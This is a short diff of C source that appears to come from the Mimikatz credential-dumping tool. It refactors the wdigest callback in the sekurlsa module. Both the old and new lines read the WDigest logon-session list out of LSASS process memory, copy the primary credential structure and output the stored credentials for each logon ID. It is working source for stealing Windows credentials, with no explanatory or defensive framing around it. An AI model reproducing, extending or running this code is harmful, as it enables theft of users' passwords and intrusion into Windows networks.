@@ -35,22 +35,22 @@ NTSTATUS kuhl_m_sekurlsa_wdigest(int argc, wchar_t * argv[])
 	return kuhl_m_sekurlsa_getLogonData(kuhl_m_sekurlsa_wdigest_single_package, 1, NULL, NULL);
 }
 
-void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_wdigest(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN PLUID logId, IN PVOID pCredentials, IN OPTIONAL PKUHL_M_SEKURLSA_EXTERNAL externalCallback, IN OPTIONAL LPVOID externalCallbackData)
+void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_wdigest(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL PKUHL_M_SEKURLSA_EXTERNAL externalCallback, IN OPTIONAL LPVOID externalCallbackData)
 {
 	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS aLocalMemory = {NULL, &hLocalMemory}, aLsassMemory = {NULL, cLsass->hLsassMem};
+	KULL_M_MEMORY_ADDRESS aLocalMemory = {NULL, &hLocalMemory}, aLsassMemory = {NULL, pData->cLsass->hLsassMem};
 	SIZE_T taille;
 	
-	if(kuhl_m_sekurlsa_wdigest_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(cLsass, &kuhl_m_sekurlsa_wdigest_package.Module, WDigestReferences, sizeof(WDigestReferences) / sizeof(KULL_M_PATCH_GENERIC), (PVOID *) &l_LogSessList, NULL, &offsetWDigestPrimary))
+	if(kuhl_m_sekurlsa_wdigest_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &kuhl_m_sekurlsa_wdigest_package.Module, WDigestReferences, sizeof(WDigestReferences) / sizeof(KULL_M_PATCH_GENERIC), (PVOID *) &l_LogSessList, NULL, &offsetWDigestPrimary))
 	{
 		aLsassMemory.address = l_LogSessList;
 		taille = offsetWDigestPrimary + sizeof(KIWI_GENERIC_PRIMARY_CREDENTIAL);
-		if(aLsassMemory.address = kuhl_m_sekurlsa_utils_pFromLinkedListByLuid(&aLsassMemory, FIELD_OFFSET(KIWI_WDIGEST_LIST_ENTRY, LocallyUniqueIdentifier), logId))
+		if(aLsassMemory.address = kuhl_m_sekurlsa_utils_pFromLinkedListByLuid(&aLsassMemory, FIELD_OFFSET(KIWI_WDIGEST_LIST_ENTRY, LocallyUniqueIdentifier), pData->LogonId))
 		{
 			if(aLocalMemory.address = LocalAlloc(LPTR, taille))
 			{
 				if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, taille))
-					kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) ((PBYTE) aLocalMemory.address + offsetWDigestPrimary), logId, 0, externalCallback, externalCallbackData);
+					kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) ((PBYTE) aLocalMemory.address + offsetWDigestPrimary), pData->LogonId, 0, externalCallback, externalCallbackData);
 				LocalFree(aLocalMemory.address);
 			}
 		}
